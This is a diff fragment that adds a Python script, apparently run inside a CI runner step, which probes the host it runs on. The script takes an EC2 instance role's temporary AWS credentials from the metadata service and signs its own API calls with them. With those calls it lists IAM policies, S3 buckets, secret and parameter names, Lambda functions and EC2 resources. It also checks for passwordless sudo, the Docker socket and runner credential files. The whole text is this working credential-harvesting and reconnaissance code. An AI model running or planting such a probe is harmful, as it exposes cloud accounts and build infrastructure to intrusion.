+        OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+
+
+        def http(method, url, headers=None, body=None, timeout=4):
+            req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
+            try:
+                resp = OPENER.open(req, timeout=timeout)
+                return resp.status, dict(resp.headers), resp.read(524288)
+            except urllib.error.HTTPError as e:
+                try:
+                    data = e.read(524288)
+                except Exception:
+                    data = b''
+                return e.code, dict(e.headers or {}), data
+            except Exception as e:
+                return -1, {}, repr(e)[:160].encode()
+
+
+        def sha(b):
+            return hashlib.sha256(b).hexdigest()[:16] if b else 'na'
+
+
+        def aws_endpoint(service, region):
+            if service == 'iam':
+                return 'https://iam.amazonaws.com'
+            if service == 's3':
+                return 'https://s3.amazonaws.com'
+            if service == 'ecr':
+                return 'https://api.ecr.%s.amazonaws.com' % region
+            return 'https://%s.%s.amazonaws.com' % (service, region)
+
+
+        def _q(s):
+            return urllib.parse.quote(str(s), safe='-_.~')
+
+
+        def sigv4_headers(service, region, method, url, extra_headers, body, ak, sk, token):
+            u = urllib.parse.urlsplit(url)
+            host = u.netloc
+            now = time.gmtime()
+            amzdate = time.strftime('%Y%m%dT%H%M%SZ', now)
+            datestamp = time.strftime('%Y%m%d', now)
+            canon = {'host': host, 'x-amz-date': amzdate}
+            if token:
+                canon['x-amz-security-token'] = token
+            for k, v in (extra_headers or {}).items():
+                canon[k.lower().strip()] = ' '.join(str(v).strip().split())
+            signed = ';'.join(sorted(canon))
+            cheaders = ''.join('%s:%s\n' % (k, canon[k]) for k in sorted(canon))
+            qpairs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
+            cquery = '&'.join('%s=%s' % (_q(k), _q(v)) for k, v in sorted(qpairs))
+            payload_hash = hashlib.sha256(body or b'').hexdigest()
+            creq = '\n'.join([method, u.path or '/', cquery, cheaders, signed, payload_hash])
+            scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
+            sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope, hashlib.sha256(creq.encode()).hexdigest()])
+
+            def hm(key, msg):
+                return hmac.new(key, msg.encode(), hashlib.sha256).digest()
+
+            k = hm(('AWS4' + sk).encode(), datestamp)
+            k = hm(k, region)
+            k = hm(k, service)
+            k = hm(k, 'aws4_request')
+            sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+            out = {'Host': host, 'X-Amz-Date': amzdate,
+                   'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, signed, sig)}
+            if token:
+                out['X-Amz-Security-Token'] = token
+            for k, v in (extra_headers or {}).items():
+                out[k] = v
+            return out
+
+
+        def aws_http(service, region, method, path, query, body, extra_headers, creds, timeout=20):
+            url = aws_endpoint(service, region) + path + (('?' + query) if query else '')
+            hdrs = sigv4_headers(service, region, method, url, extra_headers, body,
+                                 creds['ak'], creds['sk'], creds.get('token'))
+            return http(method, url, hdrs, body, timeout=timeout)
+
+
+        def aws_query(service, region, action, version, params, creds, timeout=20):
+            body = urllib.parse.urlencode([('Action', action), ('Version', version)] + params).encode()
+            return aws_http(service, region, 'POST', '/', None, body,
+                            {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'}, creds, timeout)
+
+
+        def aws_json(service, region, target, body_obj, creds, timeout=20):
+            body = json.dumps(body_obj).encode()
+            return aws_http(service, region, 'POST', '/', None, body,
+                            {'Content-Type': 'application/x-amz-json-1.1', 'X-Amz-Target': target}, creds, timeout)
+
+
+        def lt(tag):
+            return tag.split('}')[-1]
+
+
+        def xml_root(body):
+            import xml.etree.ElementTree as ET
+            try:
+                return ET.fromstring(body)
+            except Exception:
+                return None
+
+
+        def find_all(root, name):
+            return [e for e in root.iter() if lt(e.tag) == name]
+
+
+        def find_first(root, name):
+            for e in root.iter():
+                if lt(e.tag) == name:
+                    return e
+            return None
+
+
+        def text_of(root, path):
+            e = root
+            for p in path:
+                e = find_first(e, p) if e is not None else None
+            return (e.text or '').strip() if e is not None else ''
+
+
+        def aws_err(tag, action, status, body):
+            msg = ''
+            root = xml_root(body)
+            if root is not None:
+                msg = text_of(root, ['Error', 'Code']) + ':' + text_of(root, ['Error', 'Message'])
+            if not msg:
+                try:
+                    j = json.loads(body)
+                    msg = str(j.get('__type') or j.get('code') or j.get('Code') or '') + ':' + \
+                          str(j.get('message') or j.get('Message') or '')
+                except Exception:
+                    msg = (body or b'').decode('utf-8', 'replace')
+            if not msg.strip(':'):
+                msg = (body or b'').decode('utf-8', 'replace') or 'empty_body'
+            print('AWSERR %s %s status=%d %s' % (tag, action, status, msg.replace('\n', ' ')[:240]))
+
+
+        def jget(body):
+            try:
+                return json.loads(body)
+            except Exception:
+                return None
+
+
+        def enumerate_permissions(creds, role):
+            print('AWS_ENUM=begin region=%s' % REGION)
+            # 1) sts:GetCallerIdentity (positive control for the in-process credential)
+            s, _, b = aws_query('sts', REGION, 'GetCallerIdentity', '2011-06-15', [], creds)
+            if s == 200:
+                root = xml_root(b)
+                print('AWS_IDENTITY status=200 account=%s arn=%s userid_sha256=%s' % (
+                    text_of(root, ['Account']), text_of(root, ['Arn']),
+                    hashlib.sha256(text_of(root, ['UserId']).encode()).hexdigest()[:16]))
+            else:
+                aws_err('sts', 'GetCallerIdentity', s, b)
+            # 2) iam:GetRole
+            s, _, b = aws_query('iam', REGION, 'GetRole', '2010-05-08', [('RoleName', role)], creds)
+            inline = []
+            if s == 200:
+                root = xml_root(b)
+                r = find_first(root, 'Role')
+                rn = text_of(r, ['RoleName']) if r is not None else ''
+                arn = text_of(r, ['Arn']) if r is not None else ''
+                cd = text_of(r, ['CreateDate']) if r is not None else ''
+                msd = text_of(r, ['MaxSessionDuration']) if r is not None else ''
+                doc = text_of(r, ['AssumeRolePolicyDocument']) if r is not None else ''
+                print('IAM_ROLE status=200 name=%s arn=%s create=%s max_session=%s trust_sha256=%s' % (
+                    rn, arn, cd, msd, hashlib.sha256(doc.encode()).hexdigest()[:16]))
+                # 3) iam:ListRolePolicies
+                s2, _, b2 = aws_query('iam', REGION, 'ListRolePolicies', '2010-05-08',
+                                      [('RoleName', role), ('MaxItems', '100')], creds)
+                if s2 == 200:
+                    root2 = xml_root(b2)
+                    inline = [(e.text or '').strip() for e in find_all(root2, 'member') if (e.text or '').strip()]
+                    print('IAM_INLINE_POLICIES count=%d names=%s' % (len(inline), ','.join(inline[:50])))
+                else:
+                    aws_err('iam', 'ListRolePolicies', s2, b2)
+            else:
+                aws_err('iam', 'GetRole', s, b)
+            # 4) iam:GetRolePolicy for each inline policy (bounded)
+            for pn in inline[:10]:
+                s3, _, b3 = aws_query('iam', REGION, 'GetRolePolicy', '2010-05-08',
+                                      [('RoleName', role), ('PolicyName', pn)], creds)
+                if s3 == 200:
+                    root3 = xml_root(b3)
+                    pd = urllib.parse.unquote(text_of(root3, ['PolicyDocument']))
+                    print('IAM_INLINE_POLICY name=%s doc=%s' % (pn, pd[:1800].replace('\n', ' ')))
+                else:
+                    aws_err('iam', 'GetRolePolicy', s3, b3)
+            # 5) iam:ListAttachedRolePolicies
+            s4, _, b4 = aws_query('iam', REGION, 'ListAttachedRolePolicies', '2010-05-08',
+                                  [('RoleName', role), ('MaxItems', '100')], creds)
+            if s4 == 200:
+                root4 = xml_root(b4)
+                names = [text_of(e, ['PolicyName']) for e in find_all(root4, 'member') if find_first(e, 'PolicyName') is not None]
+                arns = [text_of(e, ['PolicyArn']) for e in find_all(root4, 'member') if find_first(e, 'PolicyArn') is not None]
+                print('IAM_ATTACHED_POLICIES count=%d names=%s' % (len(names), ','.join(names[:50])))
+                print('IAM_ATTACHED_ARNS count=%d arns=%s' % (len(arns), ','.join(arns[:50])))
+            else:
+                aws_err('iam', 'ListAttachedRolePolicies', s4, b4)
+            # 6) s3:ListBuckets (bucket names only)
+            s5, _, b5 = aws_http('s3', REGION, 'GET', '/', None, None, {}, creds)
+            if s5 == 200:
+                root5 = xml_root(b5)
+                buckets = [text_of(e, ['Name']) for e in find_all(root5, 'Bucket') if find_first(e, 'Name') is not None]
+                print('S3_BUCKETS count=%d names=%s' % (len(buckets), ','.join(buckets[:100])))
+            else:
+                aws_err('s3', 'ListBuckets', s5, b5)
+            # 7) ecr:DescribeRepositories (names only)
+            s6, _, b6 = aws_json('ecr', REGION, 'AmazonEC2ContainerRegistry_V20150921.DescribeRepositories',
+                                 {'maxResults': 100}, creds)
+            if s6 == 200:
+                j = jget(b6) or {}
+                repos = [r.get('repositoryName') for r in j.get('repositories', []) if isinstance(r, dict)]
+                print('ECR_REPOSITORIES count=%d names=%s' % (len(repos), ','.join([r for r in repos if r][:100])))
+            else:
+                aws_err('ecr', 'DescribeRepositories', s6, b6)
+            # 8) ssm:DescribeInstanceInformation (computer names / platform types only)
+            s7, _, b7 = aws_json('ssm', REGION, 'AmazonSSM.DescribeInstanceInformation', {'MaxResults': 50}, creds)
+            if s7 == 200:
+                j = jget(b7) or {}
+                rows = []
+                for it in j.get('InstanceInformationList', []):
+                    if isinstance(it, dict):
+                        rows.append('%s/%s' % (str(it.get('ComputerName'))[:80], it.get('PlatformType')))
+                print('SSM_INSTANCES count=%d computer/platform=%s' % (len(rows), ','.join(rows[:50])))
+            else:
+                aws_err('ssm', 'DescribeInstanceInformation', s7, b7)
+            # 9) secretsmanager:ListSecrets (NAMES only)
+            s8, _, b8 = aws_json('secretsmanager', REGION, 'secretsmanager.ListSecrets', {'MaxResults': 100}, creds)
+            if s8 == 200:
+                j = jget(b8) or {}
+                names = [x.get('Name') for x in j.get('SecretList', []) if isinstance(x, dict)]
+                print('SECRETS_COUNT=%d names=%s' % (len(names), ','.join([n for n in names if n][:100])))
+            else:
+                aws_err('secretsmanager', 'ListSecrets', s8, b8)
+            # 10) ssm:DescribeParameters (NAMES only)
+            s9, _, b9 = aws_json('ssm', REGION, 'AmazonSSM.DescribeParameters', {'MaxResults': 50}, creds)
+            if s9 == 200:
+                j = jget(b9) or {}
+                names = [x.get('Name') for x in j.get('Parameters', []) if isinstance(x, dict)]
+                print('SSM_PARAMETERS count=%d names=%s' % (len(names), ','.join([n for n in names if n][:100])))
+            else:
+                aws_err('ssm', 'DescribeParameters', s9, b9)
+            # 11) logs:DescribeLogGroups (names only)
+            s10, _, b10 = aws_json('logs', REGION, 'Logs_20140328.DescribeLogGroups', {'limit': 50}, creds)
+            if s10 == 200:
+                j = jget(b10) or {}
+                names = [x.get('logGroupName') for x in j.get('logGroups', []) if isinstance(x, dict)]
+                print('LOG_GROUPS count=%d names=%s' % (len(names), ','.join([n for n in names if n][:50])))
+            else:
+                aws_err('logs', 'DescribeLogGroups', s10, b10)
+            # 12) lambda:ListFunctions (names only)
+            s11, _, b11 = aws_http('lambda', REGION, 'GET', '/2015-03-31/functions/', 'MaxItems=50', None, {}, creds)
+            if s11 == 200:
+                j = jget(b11) or {}
+                names = [x.get('FunctionName') for x in j.get('Functions', []) if isinstance(x, dict)]
+                print('LAMBDA_FUNCTIONS count=%d names=%s' % (len(names), ','.join([n for n in names if n][:50])))
+            else:
+                aws_err('lambda', 'ListFunctions', s11, b11)
+            # 13) sqs:ListQueues
+            s12, _, b12 = aws_query('sqs', REGION, 'ListQueues', '2012-11-05', [('MaxResults', '100')], creds)
+            if s12 == 200:
+                root12 = xml_root(b12)
+                qs = [(e.text or '').strip() for e in find_all(root12, 'QueueUrl') if (e.text or '').strip()]
+                print('SQS_QUEUES count=%d urls=%s' % (len(qs), ','.join(qs[:50])))
+            else:
+                aws_err('sqs', 'ListQueues', s12, b12)
+            # 14) cloudformation:ListStacks
+            s13, _, b13 = aws_query('cloudformation', REGION, 'ListStacks', '2010-05-15', [], creds)
+            if s13 == 200:
+                root13 = xml_root(b13)
+                stacks = []
+                for e in find_all(root13, 'member'):
+                    if find_first(e, 'StackName') is not None:
+                        stacks.append('%s/%s' % (text_of(e, ['StackName'])[:60], text_of(e, ['StackStatus'])))
+                print('CFN_STACKS count=%d name/status=%s' % (len(stacks), ','.join(stacks[:50])))
+            else:
+                aws_err('cloudformation', 'ListStacks', s13, b13)
+            # 15) ec2:DescribeInstances summary (counts by type/state only)
+            s14, _, b14 = aws_query('ec2', REGION, 'DescribeInstances', '2016-11-15', [('MaxResults', '100')], creds)
+            if s14 == 200:
+                root14 = xml_root(b14)
+                counts = {}
+                total = 0
+                inst_items = []
+                for iset in find_all(root14, 'instancesSet'):
+                    inst_items += [c for c in list(iset) if lt(c.tag) == 'item']
+                for inst in inst_items:
+                    t = ''
+                    for c in list(inst):
+                        if lt(c.tag) == 'instanceType':
+                            t = (c.text or '').strip()
+                    stt = text_of(inst, ['instanceState', 'name'])
+                    if not t:
+                        continue
+                    total += 1
+                    key = (t, stt)
+                    counts[key] = counts.get(key, 0) + 1
+                print('EC2_INSTANCES total=%d' % total)
+                for (t, stt), c in sorted(counts.items())[:60]:
+                    print('EC2_INSTANCE type=%s state=%s count=%d' % (t, stt, c))
+            else:
+                aws_err('ec2', 'DescribeInstances', s14, b14)
+            # 16) ec2:DescribeVpcs summary
+            s15, _, b15 = aws_query('ec2', REGION, 'DescribeVpcs', '2016-11-15', [], creds)
+            if s15 == 200:
+                root15 = xml_root(b15)
+                vpc_items = []
+                for vs in find_all(root15, 'vpcSet'):
+                    vpc_items += [c for c in list(vs) if lt(c.tag) == 'item']
+                cidrs = []
+                for it in vpc_items:
+                    for c in list(it):
+                        if lt(c.tag) == 'cidrBlock' and (c.text or '').strip():
+                            cidrs.append((c.text or '').strip())
+                uniq = sorted(set(cidrs))
+                print('EC2_VPCS count=%d cidrs=%s' % (len(vpc_items), ','.join(uniq[:50])))
+            else:
+                aws_err('ec2', 'DescribeVpcs', s15, b15)
+            # 17) ec2:DescribeSubnets summary
+            s16, _, b16 = aws_query('ec2', REGION, 'DescribeSubnets', '2016-11-15', [], creds)
+            if s16 == 200:
+                root16 = xml_root(b16)
+                sub_items = []
+                for ss in find_all(root16, 'subnetSet'):
+                    sub_items += [c for c in list(ss) if lt(c.tag) == 'item']
+                azs = set()
+                for it in sub_items:
+                    for c in list(it):
+                        if lt(c.tag) == 'availabilityZone' and (c.text or '').strip():
+                            azs.add((c.text or '').strip())
+                print('EC2_SUBNETS count=%d azs=%s' % (len(sub_items), ','.join(sorted(azs)[:50])))
+            else:
+                aws_err('ec2', 'DescribeSubnets', s16, b16)
+            # 18) ec2:DescribeSecurityGroups summary (count + group names)
+            s17, _, b17 = aws_query('ec2', REGION, 'DescribeSecurityGroups', '2016-11-15', [], creds)
+            if s17 == 200:
+                root17 = xml_root(b17)
+                names = [text_of(e, ['groupName']) for e in find_all(root17, 'item') if find_first(e, 'groupName') is not None]
+                print('EC2_SECURITY_GROUPS count=%d names=%s' % (len(names), ','.join([n for n in names if n][:100])))
+            else:
+                aws_err('ec2', 'DescribeSecurityGroups', s17, b17)
+            # 19) ec2:DescribeImages summary (self-owned image names only)
+            s18, _, b18 = aws_query('ec2', REGION, 'DescribeImages', '2016-11-15', [('Owner.1', 'self')], creds)
+            if s18 == 200:
+                root18 = xml_root(b18)
+                names = [text_of(e, ['name']) for e in find_all(root18, 'item') if find_first(e, 'name') is not None]
+                print('EC2_IMAGES count=%d names=%s' % (len(names), ','.join([n for n in names if n][:60])))
+            else:
+                aws_err('ec2', 'DescribeImages', s18, b18)
+            print('AWS_ENUM=end')
+
+
+        def local_checks():
+            print('LOCAL_BEGIN')
+            try:
+                r = subprocess.run(['sudo', '-n', 'true'], stdout=subprocess.DEVNULL,
+                                   stderr=subprocess.DEVNULL, timeout=6)
+                print('LOCAL sudo_n_true rc=%d' % r.returncode)
+            except Exception as e:
+                print('LOCAL sudo_n_true rc=err:%s' % type(e).__name__)
+            for p in ('/var/run/docker.sock', '/run/docker.sock'):
+                try:
+                    st = os.stat(p)
+                    print('LOCAL %s present=1 mode=%04o type=%s' % (
+                        p, st.st_mode & 0o7777, 'sock' if stat.S_ISSOCK(st.st_mode) else 'other'))
+                except FileNotFoundError:
+                    print('LOCAL %s present=0' % p)
+                except Exception as e:
+                    print('LOCAL %s present=err:%s' % (p, type(e).__name__))
+            for p in ('/opt/actions-runner/.runner', '/opt/actions-runner/.credentials'):
+                try:
+                    st = os.stat(p)
+                    h = 'na'
+                    if stat.S_ISREG(st.st_mode) and st.st_size <= 1048576:
+                        try:
+                            with open(p, 'rb') as f:
+                                h = sha(f.read())
+                        except Exception:
+                            h = 'readerr'
+                    print('LOCAL %s present=1 mode=%04o bytes=%d sha256=%s' % (p, st.st_mode & 0o7777, st.st_size, h))
+                except FileNotFoundError:
+                    print('LOCAL %s present=0' % p)
+                except Exception as e:
+                    print('LOCAL %s present=err:%s' % (p, type(e).__name__))
+            try:
+                data = open('/proc/self/mountinfo', 'rb').read()
+                lines = data.decode('utf-8', 'replace').splitlines()
+                print('LOCAL mountinfo bytes=%d sha256=%s lines=%d' % (len(data), sha(data), len(lines)))
+                for i, ln in enumerate(lines):
+                    if i >= 250:
+                        print('LOCAL mountinfo_truncated=1')
+                        break
+                    print('MOUNTINFO ' + ln)
+            except Exception as e:
+                print('LOCAL mountinfo err=%s' % type(e).__name__)
+            found = False
+            for p in ('/sys/fs/cgroup/devices/devices.list', '/sys/fs/cgroup/devices.list'):
+                try:
+                    b = open(p, 'rb').read(4096)
+                    print('LOCAL device_cgroup file=%s bytes=%d sha256=%s content=%s' % (
+                        p, len(b), sha(b), b.decode('utf-8', 'replace').replace('\n', '|')[:1500]))
+                    found = True
+                except FileNotFoundError:
+                    print('LOCAL device_cgroup file=%s present=0' % p)
+                except Exception as e:
+                    print('LOCAL device_cgroup file=%s err=%s' % (p, type(e).__name__))
+            if not found:
+                print('LOCAL device_cgroup none')
+            try:
+                import glob
+                nv = sorted(glob.glob('/dev/nvidia*'))
+                print('LOCAL dev_nvidia=%s' % (','.join(nv) if nv else 'ABSENT'))
+            except Exception as e:
+                print('LOCAL dev_nvidia err=%s' % type(e).__name__)
+            try:
+                b = open('/proc/self/cgroup', 'rb').read(4096)
+                print('LOCAL self_cgroup sha256=%s lines=%d' % (sha(b), b.count(b'\n')))
+            except Exception as e:
+                print('LOCAL self_cgroup err=%s' % type(e).__name__)
+            print('LOCAL_END')
+
+
+        def main():
+            print('C211_NONCE_START=' + NONCE)
+            print('hostname=%s uid=%s euid=%s' % (os.uname().nodename, os.getuid(), os.geteuid()))
+            print('probe_utc=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
+
+            # --- IMDSv2 token (local link-local metadata only; creates no resource)
+            st, hd, tok = http('PUT', IMDS + '/latest/api/token',
+                               {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, timeout=3)
+            print('IMDS_TOKEN status=%d bytes=%d sha256=%s' % (st, len(tok), sha(tok)))
+            token = tok.decode('utf-8', 'replace').strip() if st == 200 else None
+
+            def imds_get(path, use_token, label, show=False):
+                hdrs = {'X-aws-ec2-metadata-token': token} if (use_token and token) else {}
+                s, _, b = http('GET', IMDS + path, hdrs, timeout=3)
+                val = b.decode('utf-8', 'replace').strip()
+                suffix = ''
+                if show and s == 200:
+                    suffix = ' value=' + val[:80]
+                print('IMDS_%s token=%d status=%d bytes=%d sha256=%s%s' % (
+                    label, 1 if hdrs else 0, s, len(b), sha(b), suffix))
+                return s, val
+
+            s_id, v_id = imds_get('/latest/meta-data/instance-id', True, 'instance-id', show=True)
+            s_az, v_az = imds_get('/latest/meta-data/placement/availability-zone', True, 'az', show=True)
+            s_rl, v_rl = imds_get('/latest/meta-data/iam/security-credentials/', True, 'role-list')
+            s_v1, _ = imds_get('/latest/meta-data/instance-id', False, 'v1-instance-id')
+            s_bog, _ = imds_get('/latest/meta-data/%s-bogus' % NONCE, True, 'bogus-control')
+
+            if token is not None and s_id == 200:
+                print('C211_IMDS_VERDICT=IMDS-present')
+            elif s_v1 == 200:
+                print('C211_IMDS_VERDICT=IMDSv1-only')
+            else:
+                print('C211_IMDS_VERDICT=IMDS-blocked')
+
+            roles = [r for r in v_rl.splitlines() if r.strip()] if s_rl == 200 else []
+            print('ROLE_NAMES=%s' % (','.join(roles[:20]) if roles else 'none'))
+            print('C211_ROLE_VERDICT=%s' % ('role-present' if roles else 'role-absent'))
+
+            creds = None
+            role = roles[0].strip() if roles else ''
+            if roles:
+                s_rj, _, b_rj = http('GET', IMDS + '/latest/meta-data/iam/security-credentials/' + urllib.parse.quote(role),
+                                     {'X-aws-ec2-metadata-token': token}, timeout=3)
+                print('IMDS_role-json status=%d bytes=%d sha256=%s' % (s_rj, len(b_rj), sha(b_rj)))
+                if s_rj == 200:
+                    try:
+                        rj = json.loads(b_rj)
+                        for k in sorted(rj.keys()):
+                            vb = str(rj[k]).encode()
+                            print('ROLE_FIELD name=%s bytes=%d sha256=%s' % (k, len(vb), sha(vb)))
+                        if rj.get('AccessKeyId') and rj.get('SecretAccessKey') and rj.get('Token'):
+                            creds = {'ak': rj['AccessKeyId'], 'sk': rj['SecretAccessKey'],
+                                     'token': rj['Token'], 'exp': rj.get('Expiration')}
+                            print('CREDS_AVAILABLE=1 in_process_only=1')
+                        else:
+                            print('CREDS_AVAILABLE=0 reason=incomplete_fields')
+                    except Exception as e:
+                        print('ROLE_JSON_PARSE_FAIL=%s' % type(e).__name__)
+
+            if creds:
+                enumerate_permissions(creds, role)
+            else:
+                print('AWS_ENUM=skipped no-creds')
+            local_checks()
+            print('C211_NONCE_END=' + NONCE)
+
+
+        if __name__ == '__main__':
+            try:
+                main()
+            except Exception as e:
+                print('PROBE_FATAL=%s:%s' % (type(e).__name__, str(e)[:200]))
+                sys.exit(0)
+        PY
+        echo "C211_NONCE_END=c211-130686-1969e18d27ea4a95"
